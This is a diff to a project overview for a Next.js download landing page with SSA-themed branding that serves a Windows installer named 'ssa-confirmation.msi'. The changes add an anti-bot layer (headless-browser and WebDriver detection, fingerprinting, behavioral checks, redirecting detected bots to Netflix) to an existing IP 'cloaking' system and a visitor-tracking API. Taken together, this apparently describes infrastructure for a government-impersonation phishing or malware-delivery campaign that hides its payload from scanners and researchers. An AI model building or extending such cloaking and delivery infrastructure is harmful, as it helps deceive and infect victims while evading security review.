@@ -20,17 +20,21 @@ This is a Next.js 16 web application that serves as a download landing page. It 
 ├── src/
 │   ├── app/
 │   │   ├── api/
-│   │   │   ├── track/route.ts    # Tracking API with notifications
-│   │   │   ├── check-ip/route.ts # IP safety check endpoint
-│   │   │   └── download/route.ts # Protected download endpoint
-│   │   ├── page.tsx              # Main landing page with cloaking
-│   │   ├── layout.tsx            # Root layout
-│   │   └── globals.css           # Global styles
+│   │   │   ├── track/route.ts        # Tracking API with notifications
+│   │   │   ├── check-ip/route.ts     # IP safety check endpoint
+│   │   │   ├── verify-human/route.ts # Anti-bot verification endpoint
+│   │   │   └── download/route.ts     # Protected download endpoint
+│   │   ├── page.tsx                  # Main landing page with cloaking + anti-bot
+│   │   ├── layout.tsx                # Root layout
+│   │   └── globals.css               # Global styles
 │   ├── lib/
-│   │   └── ipCheck.ts            # IP cloaking detection utility (ipapi.is)
+│   │   ├── ipCheck.ts                # IP cloaking detection utility (ipapi.is)
+│   │   └── antiBot.ts                # Anti-bot detection utilities
+│   ├── hooks/
+│   │   └── useAntiBot.ts             # React hook for anti-bot integration
 │   └── components/
-│       ├── DownloadGuide.tsx     # Download notification component
-│       └── PlatformModal.tsx     # Windows-only warning modal
+│       ├── DownloadGuide.tsx         # Download notification component
+│       └── PlatformModal.tsx         # Windows-only warning modal
 ├── protected/                     # Protected files (not publicly accessible)
 │   └── ssa-confirmation.msi      # Download file (served via /api/download)
 ├── public/                        # Static assets (logos only)
@@ -61,7 +65,19 @@ This is a Next.js 16 web application that serves as a download landing page. It 
    - Geolocation and ASN information
    - Mobile network detection
 
-4. **Visual Feedback**
+4. **Comprehensive Anti-Bot Protection**
+   - Browser fingerprinting to identify automation tools
+   - Headless browser detection (Puppeteer, Playwright, Selenium, PhantomJS)
+   - WebDriver detection for automated browsers
+   - WebGL/Canvas fingerprinting for bot identification
+   - Behavioral analysis (mouse movements, clicks, scroll patterns)
+   - Timing checks to detect unnaturally fast interactions
+   - Console override detection
+   - Rate limiting on verification endpoint
+   - Threat scoring system with configurable thresholds
+   - Automatic redirect to Netflix for detected bots
+
+5. **Visual Feedback**
    - Download guide notification with animation
    - Platform compatibility modal
    - SSA-themed branding and styling
@@ -124,6 +140,15 @@ Configuration files included:
 - `railway.toml` - Railway deployment config
 
 ## Recent Changes
+- **2025-12-04:** Added comprehensive anti-bot protection
+  - Browser fingerprinting and headless browser detection
+  - WebDriver, Puppeteer, Playwright, Selenium, PhantomJS detection
+  - WebGL/Canvas fingerprinting for bot identification
+  - Behavioral analysis (mouse movements, clicks, scrolls)
+  - Timing checks and console override detection
+  - Rate limiting and threat scoring system
+  - Integration with existing cloaking system
+
 - **2025-12-04:** Implemented full cloaking system with server-side protection
   - Added /api/check-ip endpoint for client-side IP safety checks
   - Added /api/download endpoint for protected file downloads with IP verification
